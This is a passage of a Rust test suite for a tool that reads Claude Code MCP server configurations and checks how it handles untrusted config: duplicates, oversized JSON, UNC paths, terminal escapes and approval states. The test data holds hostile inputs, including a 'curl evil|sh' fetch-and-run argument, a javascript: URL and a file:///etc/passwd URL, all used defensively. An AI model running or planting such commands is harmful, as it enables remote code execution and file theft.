        .unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {}}}),
        );
        let s = e.load();
        assert_eq!(find(&s, Scope::Project, "a").target, "second");
        assert!(
            s.warnings.iter().any(|w| w.contains("more than once")),
            "{:?}",
            s.warnings
        );
        assert_eq!(s.servers.iter().filter(|r| r.name == "a").count(), 1);
    }

    #[test]
    fn a_name_defined_many_times_is_reported_once() {
        // Found reviewing main: one warning per repeat, so a file repeating a name buried every other warning (the
        // app shows the first few) and `klefki-cli` printed them all.
        let e = Env::new();
        let p = e.project("dup");
        let repeats: String = (0..1000)
            .map(|i| format!(r#""a":{{"command":"c{i}"}},"b":{{"command":"x"}},"#))
            .collect();
        std::fs::write(
            p.join(".mcp.json"),
            format!(r#"{{"mcpServers":{{{repeats}"c":{{"command":"y"}}}}}}"#),
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {}}}),
        );
        let s = e.load();
        let repeated: Vec<_> = s
            .warnings
            .iter()
            .filter(|w| w.contains("more than once"))
            .collect();
        assert_eq!(repeated.len(), 2, "{repeated:?}");
        assert_eq!(find(&s, Scope::Project, "a").target, "c999");
    }

    #[test]
    fn hostile_mcp_json_is_contained() {
        let e = Env::new();
        let big = e.project("big");
        std::fs::write(big.join(".mcp.json"), " ".repeat(MAX_MCP_JSON as usize + 1)).unwrap();
        let many = e.project("many");
        let servers: serde_json::Map<String, Value> = (0..=MAX_MCP_SERVERS)
            .map(|i| (format!("s{i}"), json!({"command": "x"})))
            .collect();
        std::fs::write(
            many.join(".mcp.json"),
            json!({"mcpServers": servers}).to_string(),
        )
        .unwrap();
        let deep = e.project("deep");
        std::fs::write(
            deep.join(".mcp.json"),
            format!("{}{}", "[".repeat(10_000), "]".repeat(10_000)),
        )
        .unwrap();
        let junk = e.project("junk");
        std::fs::write(junk.join(".mcp.json"), "not json at all").unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {
                big.to_string_lossy(): {}, many.to_string_lossy(): {},
                deep.to_string_lossy(): {}, junk.to_string_lossy(): {}}}),
        );
        let s = e.load();
        assert!(s.servers.is_empty());
        assert_eq!(s.warnings.len(), 4, "{:?}", s.warnings);
    }

    #[test]
    fn invalid_entries_are_flagged_not_fatal() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {
                "js": {"type":"http","url":"javascript:alert(1)"},
                "file": {"type":"sse","url":"file:///etc/passwd"},
                "httpOnWs": {"type":"ws","url":"https://x.example.com"},
                "nourl": {"type":"http"},
                "nocmd": {"type":"stdio"},
                "alien": {"type":"carrier-pigeon"},
                "scalar": 42
            }}),
        );
        let s = e.load();
        assert_eq!(s.servers.len(), 7);
        assert!(
            s.servers
                .iter()
                .all(|r| r.transport == TransportKind::Invalid),
            "{:?}",
            s.servers
        );
    }

    #[test]
    fn names_that_differ_only_by_case_are_flagged() {
        let e = Env::new();
        let p = e.project("app");
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"Gateway": {"command": "a"}, "plain": {"command": "b"}},
                "projects": {p.to_string_lossy(): {"mcpServers": {"gateway": {"command": "c"}}}}
            }),
        );
        let s = e.load();
        assert!(find(&s, Scope::User, "Gateway").casing_collision);
        assert!(find(&s, Scope::Local, "gateway").casing_collision);
        assert!(!find(&s, Scope::User, "plain").casing_collision);
    }

    #[test]
    fn same_name_in_two_scopes_is_not_a_casing_collision() {
        let e = Env::new();
        let p = e.project("app");
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"same": {"command": "a"}},
                "projects": {p.to_string_lossy(): {"mcpServers": {"same": {"command": "c"}}}}
            }),
        );
        assert!(e.load().servers.iter().all(|r| !r.casing_collision));
    }

    #[test]
    fn project_spellings_are_merged() {
        assert_eq!(normalise_project("c:\\Users\\x\\"), "C:/Users/x");
        assert_eq!(normalise_project("C:/Users/x"), "C:/Users/x");
        assert_eq!(normalise_project("/home/x/"), "/home/x");
        assert_eq!(normalise_project("/"), "/");
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"projects": {
                "c:\\Users\\x": {"mcpServers": {"a": {"command": "one"}}},
                "C:/Users/x/": {"mcpServers": {"a": {"command": "two"}, "b": {"command": "b"}}}}}),
        );
        let s = e.load();
        assert_eq!(s.servers.iter().filter(|r| r.name == "a").count(), 1);
        assert_eq!(s.servers.len(), 2);
    }

    #[test]
    fn only_local_absolute_project_paths_are_opened() {
        for bad in [
            "\\\\evil\\share\\x",
            "//evil/share/x",
            // Found reviewing main: Windows reads either slash in the prefix, so these are UNC paths too.
            "/\\evil\\share\\x",
            "\\/evil/share/x",
            "relative/dir",
            "..\\x",
            "a\0b",
            "",
        ] {
            assert!(!is_safe_project_path(bad), "{bad:?}");
        }
        let e = Env::new();
        assert!(is_safe_project_path(&e.project("ok").to_string_lossy()));
    }

    #[test]
    fn unsafe_project_paths_still_list_local_servers_but_warn() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"projects": {"\\\\evil\\share\\proj": {"mcpServers": {"x": {"command": "c"}}}}}),
        );
        let s = e.load();
        assert_eq!(s.servers.len(), 1);
        assert!(
            s.warnings
                .iter()
                .any(|w| w.contains("not a local absolute path"))
        );
    }

    #[test]
    fn a_local_server_in_a_project_whose_mcp_json_is_skipped_still_shadows() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"x": {"command": "u"}},
                "projects": {"\\\\evil\\share\\proj": {"mcpServers": {"x": {"command": "c"}}}}
            }),
        );
        let s = e.load();
        let x = find(&s, Scope::User, "x");
        assert_eq!(x.shadowed_in.len(), 1);
        assert!(x.shadowed, "the only known project");
    }

    #[test]
    fn missing_or_corrupt_config_gives_a_warning_not_a_panic() {
        let e = Env::new();
        let s = e.load();
        assert!(s.servers.is_empty() && s.warnings.len() == 1);
        e.write_raw(".claude.json", "{ broken");
        let s = e.load();
        assert!(s.servers.is_empty() && s.warnings.len() == 1);
        e.write_raw(".claude.json", "[1,2,3]");
        assert_eq!(e.load().warnings.len(), 1);
    }

    #[test]
    fn corrupt_cache_files_only_lose_the_hints() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"a": {"command": "x"}}}),
        );
        e.write_raw("mcp-health-cache.json", "garbage");
        let s = e.load();
        assert_eq!(s.servers.len(), 1);
        assert_eq!(s.servers[0].status, Status::Unknown);
        assert_eq!(s.warnings.len(), 1);
    }

    #[test]
    fn terminal_escapes_and_bidi_in_config_text_are_sanitised() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {
                "evil\u{1b}[31mname\u{202e}": {"command": "run\u{1b}[0m\u{7}me"}}}),
        );
        let s = e.load();
        assert_eq!(s.servers[0].name, "evilname");
        assert_eq!(s.servers[0].target, "runme");
    }

    #[test]
    fn an_escape_in_one_argument_hides_none_of_the_others() {
        // Found reviewing main: the command line was cleaned only after it was joined, so an escape left open in
        // one argument swallowed the arguments after it, and the row read `node --title= server.js`.
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"a": {"command": "node", "args": [
                "--title=\u{1b}]", "-e", "require('child_process').execSync('curl evil|sh')", "\u{7}",
                "server.js"]}}}),
        );
        let s = e.load();
        let target = &s.servers[0].target;
        assert!(
            target.contains(" -e require('child_process').execSync('curl evil|sh') "),
            "{target:?}"
        );
        assert!(target.ends_with("server.js"), "{target:?}");
        // Within one argument, a sequence that was never one ends where its text starts.
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"a": {"command": "node", "args": ["a\u{1b}[日本語のテキストhello"]}}}),
        );
        assert_eq!(e.load().servers[0].target, "node a日本語のテキストhello");
    }

    #[test]
    fn names_and_commands_from_a_repository_stay_on_one_line() {
        // Found reviewing main: line breaks were kept, so a name or argument in `.mcp.json` could draw a row of its
        // own in the grid and in `klefki-cli list`.
        let e = Env::new();
        let p = e.project("repo");
        std::fs::write(
            p.join(".mcp.json"),
            json!({"mcpServers": {
                "docs\ngithub  on   http   https://api.github.com/mcp": {"command": "x"},
                "tabbed": {"command": "run\tit", "args": ["a\nFORGED LINE", "b\u{2028}c\u{2029}d"],
                    "oauth": {"clientId": "id\none", "scopes": ["s\ntwo"]}}}})
            .to_string(),
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {}}}),
        );
        let s = e.load();
        for row in &s.servers {
            let oauth = row
                .oauth
                .iter()
                .flat_map(|o| o.client_id.iter().chain(&o.scopes));
            for text in [&row.name, &row.target].into_iter().chain(oauth) {
                assert!(
                    !text.contains(['\n', '\t', '\u{2028}', '\u{2029}']),
                    "{text:?}"
                );
            }
        }
        let tabbed = find(&s, Scope::Project, "tabbed");
        assert_eq!(tabbed.target, "run it a FORGED LINE b c d");
    }

    #[test]
    fn long_text_is_clipped() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"a": {"command": "x".repeat(10_000)}}}),
        );
        let s = e.load();
        assert!(s.servers[0].target.chars().count() <= MAX_TEXT_CHARS + 1);
    }

    // ---- enabled / disabled and approval, per decision 002 ----

    fn write_local_settings(project: &Path, v: &Value) {
        let dir = project.join(".claude");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("settings.local.json"), v.to_string()).unwrap();
    }

    fn project_with_mcp_json(e: &Env, name: &str, servers: &[&str]) -> PathBuf {
        let p = e.project(name);
        let entries: serde_json::Map<String, Value> = servers
            .iter()
            .map(|s| {
                (
                    (*s).to_owned(),
                    json!({"type": "http", "url": "https://p.example.com"}),
                )
            })
            .collect();
        std::fs::write(
            p.join(".mcp.json"),
            json!({"mcpServers": entries}).to_string(),
        )
        .unwrap();
        p
    }

    #[test]
    fn the_toggle_is_disabledmcpservers_for_every_scope() {
        let e = Env::new();
        let p = project_with_mcp_json(&e, "app", &["proj-on", "proj-off"]);
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"user-srv": {"command": "u"}},
                "projects": {p.to_string_lossy(): {
                    "mcpServers": {"local-on": {"command": "a"}, "local-off": {"command": "b"}},
                    "disabledMcpServers": ["local-off", "proj-off"],
                    "enabledMcpjsonServers": ["proj-on", "proj-off"]
                }}
            }),
        );
        let s = e.load();
        assert!(find(&s, Scope::Local, "local-on").enabled);
        assert!(!find(&s, Scope::Local, "local-off").enabled);
        assert!(find(&s, Scope::Project, "proj-on").enabled);
        assert!(!find(&s, Scope::Project, "proj-off").enabled);
        assert!(find(&s, Scope::User, "user-srv").enabled, "not in the list");
    }

    #[test]
    fn rejecting_a_project_server_is_not_the_toggle() {
        // `disabledMcpjsonServers` is the approval dialog's "no", not the /mcp on/off switch.
        let e = Env::new();
        let p = project_with_mcp_json(&e, "app", &["srv"]);
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {"disabledMcpjsonServers": ["srv"]}}}),
        );
        let s = e.load();
        let r = find(&s, Scope::Project, "srv");
        assert!(r.enabled, "the toggle is untouched");
        assert_eq!(r.approval, Some(Approval::Rejected));
    }

    #[test]
    fn a_user_server_is_disabled_per_project() {
        let e = Env::new();
        let a = e.project("a");
        let b = e.project("b");
        let c = e.project("c");
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}, "v": {"command": "y"}},
                "projects": {
                    a.to_string_lossy(): {"disabledMcpServers": ["u", "v"]},
                    b.to_string_lossy(): {"disabledMcpServers": ["u"]},
                    c.to_string_lossy(): {}
                }
            }),
        );
        let s = e.load();
        assert_eq!(s.project_count, 3);
        let u = find(&s, Scope::User, "u");
        assert_eq!(u.disabled_in, 2);
        assert!(u.enabled, "still on in one project");
        assert_eq!(find(&s, Scope::User, "v").disabled_in, 1);
    }

    #[test]
    fn a_user_server_off_in_every_known_project_counts_as_disabled() {
        let e = Env::new();
        let a = e.project("a");
        let b = e.project("b");
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}},
                "projects": {
                    a.to_string_lossy(): {"disabledMcpServers": ["u"]},
                    b.to_string_lossy(): {"disabledMcpServers": ["u"]}
                }
            }),
        );
        let s = e.load();
        let u = find(&s, Scope::User, "u");
        assert_eq!((u.disabled_in, s.project_count), (2, 2));
        assert!(!u.enabled);
    }

    #[test]
    fn with_no_known_projects_a_user_server_is_simply_enabled() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"u": {"command": "x"}}}),
        );
        let s = e.load();
        assert_eq!(s.project_count, 0);
        let u = find(&s, Scope::User, "u");
        assert!(u.enabled);
        assert_eq!(u.disabled_in, 0);
    }

    #[test]
    fn one_project_under_two_spellings_counts_once() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}},
                "projects": {
                    "c:\\Users\\x": {"disabledMcpServers": ["u"]},
                    "C:/Users/x/": {"disabledMcpServers": ["u"]}
                }
            }),
        );
        let s = e.load();
        assert_eq!(s.project_count, 1);
        assert_eq!(find(&s, Scope::User, "u").disabled_in, 1);
    }

    #[test]
    fn the_old_switch_off_list_is_shown_and_does_not_switch_anything_off() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}, "v": {"command": "y"}},
                "projects": {
                    "/p": {
                        "mcpServers": {"l": {"command": "z"}},
                        "mcpServersDisabled": ["u", "l", "gone", "u"],
                        "disabledMcpServers": ["v", "gone"]
                    },
                    "/q": {"disabledMcpServers": []}
                }
            }),
        );
        let s = e.load();
        assert_eq!(
            s.legacy_disabled,
            [LegacyDisabled {
                project: "/p".to_owned(),
                shown: "/p".to_owned(),
                names: vec!["u".into(), "l".into(), "gone".into()],
                turns_off: vec!["u".into(), "l".into()],
                malformed: false,
            }]
        );
        // Claude Code reads only disabledMcpServers: u and l are on.
        assert!(find(&s, Scope::Local, "l").enabled);
        assert_eq!(find(&s, Scope::User, "u").disabled_in, 0);
        assert_eq!(find(&s, Scope::User, "v").disabled_in, 1);
    }

    #[test]
    fn the_old_list_merges_spellings_and_flags_what_is_not_a_name() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({
                "projects": {
                    "c:\\w\\p": {"mcpServersDisabled": ["a", 7]},
                    "C:/w/p/": {"mcpServersDisabled": ["b\u{202e}x", "a"]},
                    "/r": {"mcpServersDisabled": "a"},
                    "/s": {"mcpServersDisabled": []}
                }
            }),
        );
        let s = e.load();
        let by: Vec<(&str, &[String], bool)> = s
            .legacy_disabled
            .iter()
            .map(|l| (l.shown.as_str(), l.names.as_slice(), l.malformed))
            .collect();
        assert_eq!(
            by,
            [
                ("/r", &[][..], true),
                ("/s", &[][..], false),
                ("C:/w/p", &["a".to_owned(), "bx".to_owned()][..], true),
            ]
        );
        // Identified by the spelling the changes use, like `projects`.
        assert!(
            s.legacy_disabled
                .iter()
                .all(|l| s.projects.contains(&l.project))
        );
    }

    #[test]
    fn a_huge_old_list_is_read_in_linear_time() {
        // Review of #16: names were de-duplicated with `Vec::contains`, so 40,000 names took 1.8 s (release) on every
        // reload. The file is untrusted and may be 64 MiB.
        let e = Env::new();
        let names: Vec<String> = (0..60_000).map(|i| format!("s{i}")).collect();
        let half: Vec<&String> = names.iter().step_by(2).collect();
        e.write(
            ".claude.json",
            &json!({"projects": {
                "/p": {"mcpServersDisabled": names, "disabledMcpServers": half},
                "/p/": {"mcpServersDisabled": names}
            }}),
        );
        let started = std::time::Instant::now();
        let s = e.load();
        let took = started.elapsed();
        let l = &s.legacy_disabled[0];
        assert_eq!(l.names.len(), 60_000);
        assert_eq!(l.turns_off.len(), 30_000);
        assert!(took < std::time::Duration::from_secs(10), "{took:?}");
    }

    #[test]
    fn a_config_without_the_old_list_has_none() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"projects": {"/p": {"disabledMcpServers": ["a"]}}}),
        );
        assert!(e.load().legacy_disabled.is_empty());
    }

    #[test]
    fn junk_in_the_disabled_list_is_ignored() {
        let e = Env::new();
        let a = e.project("a");
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}},
                "projects": {a.to_string_lossy(): {"disabledMcpServers": [1, null, {"x": 1}, "u"]}}
            }),
        );
        assert_eq!(find(&e.load(), Scope::User, "u").disabled_in, 1);
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}},
                "projects": {a.to_string_lossy(): {"disabledMcpServers": "u"}}
            }),
        );
        assert_eq!(
            find(&e.load(), Scope::User, "u").disabled_in,
            0,
            "not an array"
        );
    }

    #[test]
    fn approval_is_read_from_the_project_entry_and_from_settings_local_json() {
        let e = Env::new();
        let p = project_with_mcp_json(
            &e,
            "app",
            &["in-entry", "in-local", "neither", "no-way", "both"],
        );
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {
                "enabledMcpjsonServers": ["in-entry", "both"]}}}),
        );
        write_local_settings(
            &p,
            &json!({"enabledMcpjsonServers": ["in-local"], "disabledMcpjsonServers": ["no-way", "both"]}),
        );
        let s = e.load();
        let approval = |n: &str| find(&s, Scope::Project, n).approval;
        assert_eq!(approval("in-entry"), Some(Approval::Approved));
        assert_eq!(approval("in-local"), Some(Approval::Approved));
        assert_eq!(approval("neither"), Some(Approval::Pending));
        assert_eq!(approval("no-way"), Some(Approval::Rejected));
        assert_eq!(
            approval("both"),
            Some(Approval::Rejected),
            "a rejection beats an approval"
        );
    }

    #[test]
    fn approving_everything_covers_servers_not_listed() {
        for place in ["entry", "local"] {
            let e = Env::new();
            let p = project_with_mcp_json(&e, "app", &["x", "y"]);
            if place == "entry" {
                e.write(
                    ".claude.json",
                    &json!({"projects": {p.to_string_lossy(): {"enableAllProjectMcpServers": true}}}),
                );
            } else {
                e.write(
                    ".claude.json",
                    &json!({"projects": {p.to_string_lossy(): {}}}),
                );
                write_local_settings(&p, &json!({"enableAllProjectMcpServers": true}));
            }
            let s = e.load();
            for n in ["x", "y"] {
                assert_eq!(
                    find(&s, Scope::Project, n).approval,
                    Some(Approval::Approved),
                    "{place} {n}"
                );
            }
        }
    }

    #[test]
    fn a_pending_project_server_says_so_and_other_scopes_have_no_approval() {
        let e = Env::new();
        let p = project_with_mcp_json(&e, "app", &["waiting"]);
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"u": {"command": "x"}},
                "projects": {p.to_string_lossy(): {"mcpServers": {"l": {"command": "y"}}}}
            }),
        );
        let s = e.load();
        let w = find(&s, Scope::Project, "waiting");
        assert_eq!(w.approval, Some(Approval::Pending));
        assert_eq!(w.status, Status::PendingApproval);
        assert_eq!(find(&s, Scope::User, "u").approval, None);
        assert_eq!(find(&s, Scope::Local, "l").approval, None);
    }

    #[test]
    fn a_broken_settings_local_json_is_ignored_with_a_warning() {
        let e = Env::new();
        let p = project_with_mcp_json(&e, "app", &["srv"]);
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {"enabledMcpjsonServers": ["srv"]}}}),
        );
        std::fs::create_dir_all(p.join(".claude")).unwrap();
        std::fs::write(p.join(".claude").join("settings.local.json"), "{ not json").unwrap();
        let s = e.load();
        assert_eq!(
            find(&s, Scope::Project, "srv").approval,
            Some(Approval::Approved)
        );
        assert!(
            s.warnings.iter().any(|w| w.contains("settings.local.json")),
            "{:?}",
            s.warnings
        );
        // An oversized file is refused the same way.
        std::fs::write(
            p.join(".claude").join("settings.local.json"),
            " ".repeat(MAX_MCP_JSON as usize + 1),
        )
        .unwrap();
        let s = e.load();
        assert_eq!(
            find(&s, Scope::Project, "srv").approval,
            Some(Approval::Approved)
        );
        assert!(s.warnings.iter().any(|w| w.contains("settings.local.json")));
    }

    #[test]
    fn approval_is_not_read_from_a_project_path_we_refuse_to_open() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"projects": {"\\\\evil\\share\\proj": {"enabledMcpjsonServers": ["x"]}}}),
        );
        // Nothing to list (the .mcp.json is never opened) and nothing to crash on.
        let s = e.load();
        assert!(s.servers.is_empty());
        assert_eq!(s.project_count, 1);
    }

    #[test]
    fn reading_claude_json_keeps_only_what_the_inventory_uses() {
        let env = Env::new();
        env.write_raw(
            ".claude.json",
            r#"{"numStartups": 9, "cachedChangelog": "long", "mcpServers": {"a": {"command": "x", "extra": [1]}},
                "projects": {
                  "/p": {"history": [{"display": "hi"}], "mcpServers": {"l": {"command": "y"}},
                         "disabledMcpServers": ["a"], "enabledMcpjsonServers": ["e"], "disabledMcpjsonServers": [],
                         "enableAllProjectMcpServers": true, "allowedTools": ["Bash"]},
                  "/odd": 5,
                  "/p": {"disabledMcpServers": ["later"]}
                },
                "tail": {"projects": {"/x": {}}}}"#,
        );
        let v = read_claude_json(&env.dir.path().join(".claude.json"))
            .unwrap()
            .unwrap();
        assert_eq!(
            v,
            json!({
                "mcpServers": {"a": {"command": "x", "extra": [1]}},
                "projects": {"/p": {"disabledMcpServers": ["later"]}, "/odd": null}
            })
        );
        let keys: Vec<_> = v["projects"].as_object().unwrap().keys().cloned().collect();
        assert_eq!(
            keys,
            ["/p", "/odd"],
            "file order, as a full parse would give"
        );
        // Only the last /p survives, as before; its earlier fields are not merged in.
        assert!(v["projects"]["/p"].get("history").is_none());
    }

    #[test]
    fn reading_claude_json_still_rejects_broken_json_and_reports_non_objects() {
        let env = Env::new();
        for (text, ok) in [
            ("[1, 2]", true),
            ("5", true),
            ("{\"a\": [1, }", false),
            ("{} trailing", false),
            ("{\"projects\": {\"/p\": {\"history\": [}}}", false),
        ] {
            env.write_raw(".claude.json", text);
            let got = read_claude_json(&env.dir.path().join(".claude.json"));
            assert_eq!(got.is_ok(), ok, "{text}");
            if ok {
                assert_eq!(got.unwrap(), Some(Value::Null));
            }
        }
    }

    // ------------------------------------------------------------ plugin servers (decision 008)

    impl Env {
        /// A plugin `name@mkt` that is on, installed in `plugins/cache`, with these servers in its `.mcp.json`.
        fn plugin(&self, name: &str, servers: Value) {
            let installed = self.dir.path().join("plugins/installed_plugins.json");
            let mut list = std::fs::read_to_string(&installed)
                .ok()
                .and_then(|t| serde_json::from_str::<Value>(&t).ok())
                .unwrap_or(json!({"version": 2, "plugins": {}}));
            let root = self.dir.path().join("plugins/cache/mkt").join(name);
            list["plugins"][format!("{name}@mkt")] =
                json!([{"scope": "user", "installPath": root.to_string_lossy()}]);
            self.write("plugins/installed_plugins.json", &list);
            self.write(
                &format!("plugins/cache/mkt/{name}/.mcp.json"),
                &json!({ "mcpServers": servers }),
            );
            let settings = self.dir.path().join("settings.json");
            let mut on = std::fs::read_to_string(&settings)
                .ok()
                .and_then(|t| serde_json::from_str::<Value>(&t).ok())
                .unwrap_or(json!({"enabledPlugins": {}}));
            on["enabledPlugins"][format!("{name}@mkt")] = Value::Bool(true);
            self.write("settings.json", &on);
        }
    }

    fn plugin_info(row: &ServerRow) -> &crate::api::PluginInfo {
        row.plugin.as_ref().unwrap_or_else(|| panic!("{row:#?}"))
    }

    #[test]
    fn plugin_servers_are_read_only_rows_under_the_name_claude_code_gives_them() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        e.plugin(
            "p1",
            json!({"alpha": {"command": "node", "args": ["x.js"]}, "beta": {"type": "http", "url": "https://x.example.com/mcp"}}),
        );
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:alpha"]},
                b.to_string_lossy(): {}
            }}),
        );
        // Claude Code puts plugin servers in its needs-auth cache whatever they are: not a status to show.
        e.write(
            "mcp-needs-auth-cache.json",
            &json!({"plugin:p1:alpha": {"timestamp": 9.0e15}}),
        );
        let inv = load(&e.paths());
        let s = &inv.snapshot;
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        let alpha = find(s, Scope::Plugin, "plugin:p1:alpha");
        assert_eq!(alpha.project, None);
        assert_eq!(alpha.target, "node x.js");
        assert_eq!(alpha.status, Status::Unknown);
        assert_eq!((alpha.enabled, alpha.disabled_in), (true, 1));
        assert_eq!(
            plugin_info(alpha),
            &crate::api::PluginInfo {
                plugin: "p1".into(),
                marketplace: "mkt".into(),
                same_as: None,
                written_target: None,
                off_in: Vec::new()
            }
        );
        let beta = find(s, Scope::Plugin, "plugin:p1:beta");
        assert_eq!(beta.transport, TransportKind::Http);
        // No file key: no change, check or sign-in can name a plugin's server.
        assert!(!inv.keys.contains_key(&alpha.connection));
        assert!(!inv.keys.contains_key(&beta.connection));
        assert_eq!(
            ConnectionId::parse(alpha.connection.as_str()),
            Some((Scope::Plugin, None, "plugin:p1:alpha".to_owned()))
        );

        // Off in every project it is off, as for a user server.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:alpha"]},
                b.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:alpha"]}
            }}),
        );
        assert!(!find(&e.load(), Scope::Plugin, "plugin:p1:alpha").enabled);
    }

    #[test]
    fn a_plugin_server_repeating_one_configured_by_hand_is_marked_as_left_out() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        e.plugin(
            "p1",
            json!({
                "cmd": {"command": "ls", "args": ["1"], "env": {"X": "1"}},
                "web": {"type": "http", "url": "https://x.example.com/mcp"},
                "own": {"command": "own"}
            }),
        );
        e.plugin("p2", json!({"again": {"command": "own"}}));
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"man": {"command": "ls", "args": ["1"]}},
                "projects": {
                    a.to_string_lossy(): {"mcpServers": {"site": {"type": "sse", "url": "HTTPS://X.example.com/mcp/"}}},
                    b.to_string_lossy(): {}
                }
            }),
        );
        let s = e.load();
        let cmd = find(&s, Scope::Plugin, "plugin:p1:cmd");
        assert!(cmd.shadowed, "{cmd:#?}");
        assert_eq!(plugin_info(cmd).same_as.as_deref(), Some("man"));
        // A local server hides it in its own project only.
        let web = find(&s, Scope::Plugin, "plugin:p1:web");
        assert!(!web.shadowed);
        assert_eq!(web.shadowed_in, [a.to_string_lossy().replace('\\', "/")]);
        assert_eq!(plugin_info(web).same_as.as_deref(), Some("site"));
        // An earlier plugin's server hides a later one's everywhere; the earlier one stays.
        let again = find(&s, Scope::Plugin, "plugin:p2:again");
        assert!(again.shadowed);
        assert_eq!(plugin_info(again).same_as.as_deref(), Some("plugin:p1:own"));
        assert!(!find(&s, Scope::Plugin, "plugin:p1:own").shadowed);

        // A server switched off where it is does not hide it there.
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"man": {"command": "ls", "args": ["1"]}},
                "projects": {
                    a.to_string_lossy(): {"disabledMcpServers": ["man"]},
                    b.to_string_lossy(): {}
                }
            }),
        );
        let s = e.load();
        let cmd = find(&s, Scope::Plugin, "plugin:p1:cmd");
        assert!(!cmd.shadowed);
        assert_eq!(cmd.shadowed_in, [b.to_string_lossy().replace('\\', "/")]);
    }

    #[test]
    fn a_plugin_server_is_compared_with_its_root_variable_expanded() {
        let e = Env::new();
        e.plugin(
            "p1",
            json!({"rooted": {"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/s.js"]}}),
        );
        // Claude Code puts the folder in as text, as `installed_plugins.json` spells it, before the `/s.js`.
        let installed: Value = serde_json::from_str(
            &std::fs::read_to_string(e.dir.path().join("plugins/installed_plugins.json")).unwrap(),
        )
        .unwrap();
        let root = installed["plugins"]["p1@mkt"][0]["installPath"]
            .as_str()
            .unwrap();
        let script = format!("{root}/s.js");
        // A second plugin writes the same, but its root is another folder.
        e.plugin(
            "p2",
            json!({"also": {"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/s.js"]}}),
        );
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"manual": {"command": "node", "args": [&script]}}}),
        );
        let s = e.load();
        let rooted = find(&s, Scope::Plugin, "plugin:p1:rooted");
        assert!(rooted.shadowed, "{rooted:#?}");
        assert_eq!(plugin_info(rooted).same_as.as_deref(), Some("manual"));
        // Shown as Claude Code runs it, with what the plugin writes beside it.
        assert_eq!(rooted.target, format!("node {script}"));
        assert_eq!(
            plugin_info(rooted).written_target.as_deref(),
            Some("node ${CLAUDE_PLUGIN_ROOT}/s.js")
        );
        let also = find(&s, Scope::Plugin, "plugin:p2:also");
        assert!(!also.shadowed, "{also:#?}");
        assert_eq!(plugin_info(also).same_as, None);
    }

    #[test]
    fn an_earlier_plugins_server_hides_a_later_one_only_where_it_is_loaded() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        let (sa, sb) = (
            a.to_string_lossy().replace('\\', "/"),
            b.to_string_lossy().replace('\\', "/"),
        );
        e.plugin("p1", json!({"dup": {"command": "echo", "args": ["dup"]}}));
        e.plugin("p2", json!({"dup2": {"command": "echo", "args": ["dup"]}}));
        // Off in a: there the later one is loaded.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:dup"]},
                b.to_string_lossy(): {}
            }}),
        );
        let s = e.load();
        let dup2 = find(&s, Scope::Plugin, "plugin:p2:dup2");
        assert!(!dup2.shadowed, "{dup2:#?}");
        assert_eq!(dup2.shadowed_in, std::slice::from_ref(&sb));
        assert_eq!(plugin_info(dup2).same_as.as_deref(), Some("plugin:p1:dup"));

        // Off in both: loaded in both.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:dup"]},
                b.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:dup"]}
            }}),
        );
        let dup2 = find(&e.load(), Scope::Plugin, "plugin:p2:dup2").clone();
        assert!(!dup2.shadowed && dup2.shadowed_in.is_empty(), "{dup2:#?}");

        // A local server and the earlier plugin's together: left out where either is loaded.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"mcpServers": {"local-echo": {"command": "echo", "args": ["dup"]}}},
                b.to_string_lossy(): {}
